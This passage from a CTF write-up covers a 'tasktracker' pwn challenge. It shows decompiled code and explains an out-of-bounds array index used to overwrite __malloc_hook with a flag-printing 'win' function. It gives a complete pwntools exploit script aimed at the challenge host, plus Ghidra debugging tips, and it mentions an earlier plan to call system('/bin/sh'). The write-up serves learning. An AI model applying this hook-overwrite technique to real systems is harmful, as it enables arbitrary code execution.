  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;-- -.--&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;--. .-.. .. -... -.-.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;...- . .-. ... .. --- -.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;.. ...&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;..--- .-.-.- ..--- --... .-.-.-&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">emergency_meeting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;All tasks have been tracked and the imposter have been identified&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>Nothing interesting here</p> <h3 id="hidden-flag-function"><a href="#hidden-flag-function" class="header-anchor">#</a> <s>hidden</s> flag function</h3> <p>Based on previous challenges, I expected the possibility of a simple function that we can jump to that will print out the flag. Searching strings that match &quot;flag&quot; and listing the cross-references, I see this function:</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  ulong fd<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buf <span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;flag.txt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token string">&quot;%s&quot;</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>So our target is to call this function.</p> <h2 id="exploitation"><a href="#exploitation" class="header-anchor">#</a> Exploitation</h2> <p>Since the target is statically linked and we can access any address relative to the global <code>tasks[50]</code> array (in the <code>.bss</code> section), I choose to overwrite the <code>__malloc_hook</code> function pointer with the <code>win</code> function and get it called on the next <code>malloc</code>, when I either <code>add_task</code> or <code>change_task</code>.</p> <p><code>__malloc_hook</code> is a function pointer in <code>libc</code> that is present so that users can override the default functionality of <code>malloc</code> for the purposes of instrumentation or debugging. When there is a call to <code>malloc</code>, this function pointer is checked, and if non-zero, will be called and the rest of the code in <code>malloc</code> is not executed. This function pointer is a favourite among pwners to overwrite, along with its friend <code>__free_hook</code>. Since our binary is statically linked, this function pointer is present in our <code>.bss</code>.</p> <div class="custom-block warning"><p class="custom-block-title">TIME WASTED</p> <p>Why overwrite <code>__malloc_hook</code>? Why use this vulnerability? Initially, I did not see the <code>win</code> function. My aim was to call <code>system(&quot;/bin/sh&quot;)</code> to get shell. Overwriting <code>__malloc_hook</code> to <code>system</code>, and passing a parameter that points to <code>&quot;/bin/sh&quot;</code> somewhere in memory to <code>malloc</code> was my initial aim. This is possible via <code>add_task</code>, where we can control the input we send to <code>malloc</code>, and thus to <code>__malloc_hook</code>. But the challenge authors decided to give us a freebie and include a <code>win</code> function. If we use House of Force to overwrite into the <code>commands</code> array, which is the other solution, we cannot really control the parameters passed into the function, which is why I did not use it.</p></div> <p>Now, we work backwards. If we want to write into <code>__malloc_hook</code>, we need something that points to it, but normally no such global variables exist. However, there will be some global variables that point to other global variables (e.g. A -&gt; B). If we overwrite the target global variable to point to <code>__malloc_hook</code>, we can write into it. To summarize:</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token comment">// Find some global variable A that already points to B</span>
A              <span class="token operator">-&gt;</span>           B         <span class="token operator">-&gt;</span>         <span class="token operator">?</span>


                            _malloc_hook   <span class="token operator">-&gt;</span>           <span class="token number">0</span>
<span class="token punctuation">.</span>
<span class="token punctuation">.</span>
<span class="token punctuation">.</span>
tasks<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span>


<span class="token comment">// Now, `change_task` on A, so that B points to __malloc_hook instead of it's previous value</span>
A              <span class="token operator">-&gt;</span>           B                    <span class="token operator">?</span>
                            <span class="token operator">|</span>
                            V
                            _malloc_hook   <span class="token operator">-&gt;</span>           <span class="token number">0</span>
<span class="token punctuation">.</span>
<span class="token punctuation">.</span>
<span class="token punctuation">.</span>
tasks<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span>



<span class="token comment">// Now, `change_task` on B so that we can overwrite __malloc_hook to point to win</span>
A              <span class="token operator">-&gt;</span>           B                    <span class="token operator">?</span>
                            <span class="token operator">|</span>
                            V
                            _malloc_hook   <span class="token operator">-&gt;</span>           win
<span class="token punctuation">.</span>
<span class="token punctuation">.</span>
<span class="token punctuation">.</span>
tasks<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span>
</code></pre></div><p>Such A &amp; B can be found at 0x6cc068, pointing to 0x6c800. These vales were found by scrolling backwards from the global <code>tasks[50]</code> array to find a pointer that points to another value in the <code>.bss</code>.</p> <p>We have to keep in mind that we have to pass a index to into the <code>tasks[50]</code> array, so we have to find the difference between our target address and the start of the <code>tasks[50]</code> array, divded by 0x10, the size of a task.</p> <p>The full exploit is as below:</p> <div class="language-py extra-class"><pre class="language-py"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">if</span> <span class="token string">'REMOTE'</span> <span class="token keyword">in</span> args<span class="token punctuation">:</span>
    conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;ctf-ptb1.balancedcompo.site 9997&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    conn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./tasktracker&quot;</span><span class="token punctuation">)</span>

target <span class="token operator">=</span> <span class="token number">0x06cb788</span> <span class="token comment"># malloc_hook</span>
win <span class="token operator">=</span> <span class="token number">0x0400d51</span> 

<span class="token comment"># for easier calculation of the index that we should pass into `change_task`</span>
<span class="token keyword">def</span> <span class="token function">ptr_to</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    note <span class="token operator">=</span> <span class="token number">0x06ccbc0</span> <span class="token comment"># tasks[50]</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>x<span class="token operator">-</span>note<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">,</span> task<span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;choice:&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">&quot;task:&quot;</span><span class="token punctuation">,</span> task<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">,</span> task<span class="token punctuation">)</span><span class="token punctuation">:</span>
    conn<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;choice:&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;3&quot;</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;change:&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">,</span> task<span class="token punctuation">)</span>

<span class="token comment"># add a task, so that can change is later</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
<span class="token comment"># change B to point to target = __malloc_hook. Note that the p64(1) is just for padding</span>
change<span class="token punctuation">(</span>ptr_to<span class="token punctuation">(</span><span class="token number">0x06cc068</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># change __malloc_hook to point to win</span>
change<span class="token punctuation">(</span>ptr_to<span class="token punctuation">(</span><span class="token number">0x6cb800</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># just to trigger the call to `malloc`, and thus `__malloc_hook` and our `win` function</span>
add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>

conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="tips"><a href="#tips" class="header-anchor">#</a> Tips</h2> <h3 id="decompilation"><a href="#decompilation" class="header-anchor">#</a> Decompilation</h3> <h4 id="basics"><a href="#basics" class="header-anchor">#</a> Basics</h4> <ul><li><code>Rename</code>, <code>Change Data Type</code>: Use these to rename functions and variables and change their types (how useful is undefinedX as a type, anyway?)</li> <li><code>Auto-create Structure</code>, <code>Structure Editor -&gt; Rename Field</code>: Create structs and make their field names conistent. This, paired with the above <code>Change Data Type</code> means that most code using structs will be better to look at.</li></ul> <h4 id="function-signature-mismatch-e-g-libc-start-main"><a href="#function-signature-mismatch-e-g-libc-start-main" class="header-anchor">#</a> Function Signature Mismatch (e.g. __libc_start_main)</h4> <p>Opening up the function signature (Right Click the function -&gt; Edit Function Signature)
<img src="/assets/img/__libc_start_main_function_sig.194920ef.png" alt="__libc_start_main_function_sig.png">. Following the <a href="https://www.wikiwand.com/en/X86_calling_conventions#/System_V_AMD64_ABI" target="_blank" rel="noopener noreferrer">Linux 64-bit calling convention<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, the order of passing parameters are as so:</p> <div class="language- extra-class"><pre class="language-text"><code>RDI, RSI, RDX, RCX, R8, R9, [XYZ]MM0–7
</code></pre></div><p>Re-ordering the parameters to fit the calling convention, we get:
<img src="/assets/img/__libc_start_main_function_sig_2.20be0513.png" alt="__libc_start_main_function_sig2.png">
and our function invocation is as such:</p> <p><img src="/assets/img/entry2.4694f102.png" alt="entry2.png">
Matches the actual function signature of <code>__libc_start_main</code> very nicely.</p> <h3 id="finding-library-functions"><a href="#finding-library-functions" class="header-anchor">#</a> Finding library functions</h3> <p>This is generally a very difficult thing to do, but Ghidra does have some help in this area by the means of <a href="https://www.youtube.com/watch?v=P8Ul2K7pEfU" target="_blank" rel="noopener noreferrer">FIDB<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> and <a href="https://github.com/threatrack/ghidra-fidb-repo" target="_blank" rel="noopener noreferrer">ghidra-fidb-repo<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>. Other than that, using a debugger to pause execution before a suspected library function, looking at the parameters being passed in and the return value/output, is a valid method as well.</p> <h3 id="debugging"><a href="#debugging" class="header-anchor">#</a> Debugging</h3> <p>These kind of challenges are hard to debug, especially if you want a efficient edit-run-check cycle. Using proper tools like <a href="https://docs.pwntools.com/en/stable/gdb.html" target="_blank" rel="noopener noreferrer">pwntools.gdb.attach<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> and <a href="https://gef.readthedocs.io/en/master/" target="_blank" rel="noopener noreferrer">gef<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> can make life easier.</p> <h2 id="conlcusion"><a href="#conlcusion" class="header-anchor">#</a> Conlcusion</h2> <p>For its point allocation, this challenge wasn't so hard. Overall, the <code>pwn</code> challenges for this CTF were mostly easy. Sadly no fun heap challenges 😦</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> <!----></main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.c3d8ca62.js" defer></script><script src="/assets/js/6.3722ae10.js" defer></script><script src="/assets/js/3.8eed2eee.js" defer></script><script src="/assets/js/10.4b595a00.js" defer></script>
  </body>
</html>
